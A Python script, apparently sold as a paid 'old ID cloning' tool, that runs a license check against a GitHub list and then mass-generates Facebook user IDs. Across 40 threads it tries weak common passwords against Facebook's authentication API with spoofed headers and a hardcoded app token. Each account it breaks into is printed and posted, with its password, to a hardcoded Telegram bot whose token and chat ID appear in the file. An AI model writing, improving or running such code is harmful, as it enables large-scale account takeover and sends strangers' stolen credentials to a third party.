global loop
global oks
import requests
import bs4
import json
import os
import sys
import uuid
import random
import datetime
import time
import re
from time import localtime as lt
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import threading
import hashlib
import string
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from threading import Lock

lock = Lock()
oks = []
loop = 0

# Import required modules
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# Import after ensuring modules are available
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()
import platform
import urllib.parse
import subprocess

# Color codes
R = '[91m'
G = '[92m'
Y = '[93m'
C = '[96m'
W = '[0m'
B = '[94m'
M = '[95m'
BLINK = '[5m'

def show_logo():
    logo = '\n[1;91m        ______________\n[1;93m     ,===:\'.,            `-._\n[1;92m          `:.`---.__         `-._\n[1;96m            `:.     `--.         `.\n[1;95m              \\.        `.         `.\n[1;91m      (,,(,    \\.         `.   ____,-`.,\n[1;93m   (,\'     `/   \\.   ,--.___`.\'\n[1;92m ,  ,\'  ,--.  `,   \\.;\'         `\n[1;96m `{D, {    \\  :    \\;\n[1;95m   V,,\'    /  /    //\n[1;91m   j;;    /  ,\' ,-//.    ,---.      ,\n[1;93m   \\;\'   /  ,\' /  _  \\  /  _  \\   ,\'/\n[1;92m         \\   `\'  / \\  `\'  / \\  `.\' /\n[1;96m          `.___,\'   `.__,\'   `.__,\'\n'
    print(logo)

def get_permanent_key():
    try:
        base_id = str(os.geteuid()) + str(os.getlogin())
    except:
        try:
            base_id = str(os.getuid()) + '_AVROVEL'
        except:
            base_id = 'UNKNOWN_DEVICE_ID'
    return 'PRINCE-FIRE-' + base_id

def open_whatsapp_with_key(number='994409445548', key=''):
    encoded_message = urllib.parse.quote(f'Hello Admin, My license key is: {key}')
    link = f'https://wa.me/{number}?text={encoded_message}'
    if platform.system() == 'Linux':
        subprocess.run(['am', 'start', '-a', 'android.intent.action.VIEW', '-d', link], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        import webbrowser
        webbrowser.open(link)

def show_payment_details(uid):
    os.system('clear')
    show_logo()
    print(f'{C}╔════════════════════════════════╗')
    print(f'{C}  🔑 YOUR LICENSE KEY           ')
    print(f'{C}  {Y}{uid}{C} ')
    print(f'{C}╚════════════════════════════════╝{W}\n')
    print(f'{R}╔════════════════════════════════╗')
    print(f'{R}║  ✘ LICENSE NOT APPROVED ✘      ║')
    print(f'{R}╚════════════════════════════════╝{W}\n')
    print(f'{Y}To get access, please purchase a license key.\n')
    print(f'{B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}')
    print(f'{G}  7 DAY\'s APPROVE = RS 100')
    print(f'{G}  15 DAY\'s APPROVE = RS 200')
    print(f'{G}  30 DAY\'s APPROVE = RS 350')
    print(f'{C}  OTHER COUNTRY USERS:')
    print(f'{Y}  7 DAY\'s APPROVE = 1$')
    print(f'{Y}  15 DAY\'s APPROVE = 2$')
    print(f'{Y}  30 DAY\'s APPROVE = 4$\n')
    print(f'{Y}  WHATSAPP NO => +994409445548{W}')
    print(f'{B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}\n')
    print(f'{G} BINANCE PAY ID ACCEPT')
    print(f'{G} INDIA PAYMENT PTYM+PHONEPE ACCEPT')
    print(f'{G} EASYPAISA ACCEPT')
    print(f'{R} NOTE : SEND PAYMENT PROOF ON WHATSAPP')
    print(f'{B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}\n')
    open_whatsapp_with_key('994409445548', uid)
    input(f'{Y}Press Enter to exit...{W}')

def check_approval():
    uid = get_permanent_key()
    approval_url = 'https://raw.githubusercontent.com/Prince-Khof-Mackr/Appvrol-Key/main/Prince-Fire.txt'
    os.system('clear')
    show_logo()
    print(f'{C}╔════════════════════════════════╗')
    print(f'{C}║  🔑 YOUR LICENSE KEY           ║')
    print(f'{C}║  {Y}{uid}{C} ║')
    print(f'{C}╚════════════════════════════════╝{W}\n')
    print(f'{B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}')
    print(f'{Y}[•] Checking your license key from server...{W}')
    print(f'{B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}')
    try:
        response = requests.get(approval_url).text.strip().splitlines()
        key_found = False
        for line in response:
            if '|' in line:
                key, expiry = line.split('|')
                if key.strip() == uid:
                    key_found = True
                    expiry_date = datetime.datetime.strptime(expiry.strip(), '%Y-%m-%d')
                    if datetime.datetime.now() <= expiry_date:
                        print(f'{G}╔════════════════════════════════╗')
                        print(f'{G}║   ✅ LICENSE APPROVED ✅        ║')
                        print(f'{G}║  Welcome to {M}PRINCE PREMIUM TOOL{G} ║')
                        print(f'{G}║  Expiry Date: {Y}{expiry.strip()}        {G}║')
                        print(f'{G}╚════════════════════════════════╝{W}\n')
                        time.sleep(2)
                        return True
                    else:
                        print(f'{R}Your license key has expired on {expiry.strip()}.{W}')
                        show_payment_details(uid)
                        sys.exit()
        if not key_found:
            show_payment_details(uid)
            sys.exit()
    except Exception as e:
        print(f'{R}[✘] ERROR: Could not connect to approval server.{W}')
        print(f'{Y}[!] Please check your internet connection.{W}')
        sys.exit()

# Check approval before proceeding
check_approval()
print(f'{G}[✔] Script is now running automatically because license is approved!{W}')
time.sleep(1)

BOT_TOKEN = '8041425441:AAENAdn07VQszBmM2Gi-2KPZiA7sKdd0JIk'
CHAT_ID = '7013727523'

def send_to_telegram(message):
    try:
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
        data = {'chat_id': CHAT_ID, 'text': message}
        requests.post(url, data=data)
    except Exception as e:
        return None

def lin():
    print('[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

dic = {'1': 'January', '2': 'February', '3': 'March', '4': 'April', '5': 'May', '6': 'June', '7': 'July', '8': 'August', '9': 'September', '10': 'October', '11': 'November', '12': 'December'}
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
date = str(tgl) + '-' + str(bln)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx - 12
    tag = 'PM'
else:
    a = ltx
    tag = 'AM'

A = '[1;97m'
R = '[38;5;196m'
Y = '[1;33m'
G = '[38;5;46m'
green = G
white = A
red = R
golden_yellow = '[38;5;225m'

def ua():
    rr = random.randint
    xx = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36'
    return xx

logo = f'\n{green}┏━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n{green}┃{white} H   H   I   ┃ OWNER  : PRINCE ONFIRE         ┃\n{green}┃{white} HHHHH   I   ┃ GITHUB : PRINCE KHOF           ┃\n{green}┃{white} H   H   I   ┃ STATUS : PAID                  ┃\n{green}┃{white} H   H   I   ┃ SYSTEM : PREMIUM               ┃\n{green}┗━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{white}─꯭─̽⃝DEVELOPER  ▶︎ {golden_yellow}─̽⃝ PRINCE MODE─꯭\n{green}─꯭─̽⃝NOTE       ▶︎ {white}─̽⃝ HANDLE WITH CARE─꯭\n{green}─꯭─̽⃝TOOL TYPE  ▶︎ {golden_yellow}red{green}─̽⃝ OLD CLONING─꯭\n{white}─꯭─̽⃝VERSION    ▶︎ {green}─̽⃝ 3.0─꯭\n{white}─꯭─̽⃝ ✅ 98% 😈 ▶︎ {golden_yellow}─̽⃝ ALL IDZ LOGIN ─꯭{green}\n{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'

def main():
    user = []
    os.system('clear')
    print(logo)
    
    while True:
        print('JITNI OLD ID CAHIYE SELECT KARR:')
        print('(1) 2010=2014 SPEED FIRE')
        print('(2) 2009 IDZ')
        choice = input('ENTER 1-2: ').strip()
        
        if choice == '1':
            start_uids = ['100003', '100004', '100002', '100001']
            break
        elif choice == '2':
            start_uids = ['1000004']
            break
        else:
            print('Invalid choice. Please enter 1 or 2.\n')
    
    print('(~) EXAMPLE   : 10000 | 20000 | 99999')
    lin()
    
    try:
        limit = int(input('(~) LIMIT DAL: ').strip())
    except Exception:
        print('Invalid limit. Exiting.')
        return
    
    lin()
    
    for i in range(limit):
        star = random.choice(start_uids)
        if star == '1000004':
            num_random = 8
        else:
            num_random = 9
        data = str(random.randint(10 ** (num_random - 1), 10 ** num_random - 1))
        user.append(star + data)
    
    with ThreadPool(max_workers=40) as MrDevilEx:
        os.system('clear')
        print(logo)
        print(f'(~) TOTAL ID : {limit}')
        print(f"(~) UID PREFIX : {', '.join(start_uids)}")
        print('(~) IF NO RESULT [ON/OFF]  AIRPLANE MODE')
        lin()
        for uid in user:
            MrDevilEx.submit(login, uid)

def login(uid):
    global loop
    Session = requests.session()
    try:
        for pw in ['123456789', '123456', '12345678', '1234567']:
            headers = {
                'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'user-agent': ua(),
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger'
            }
            rp = Session.get(
                'https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + 
                '&password=' + str(pw) + 
                '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', 
                headers=headers
            ).json()
            
            if 'session_key' in rp or 'www.facebook.com' in rp.get('error_msg', ''):
                msg = f'➤ 𝗣𝗥𝗜𝗡𝗖𝗘 ➤ {uid} | {pw}'
                color = '[32m'
                print(f'\r\r{color}{msg}')
                send_to_telegram(msg)
                with lock:
                    oks.append(uid)
                break
    except:
        pass
    
    with lock:
        loop += 1
        sys.stdout.write(f'\r({date}) ({loop}) ({len(oks)})')
        sys.stdout.flush()

if __name__ == '__main__':
    main()
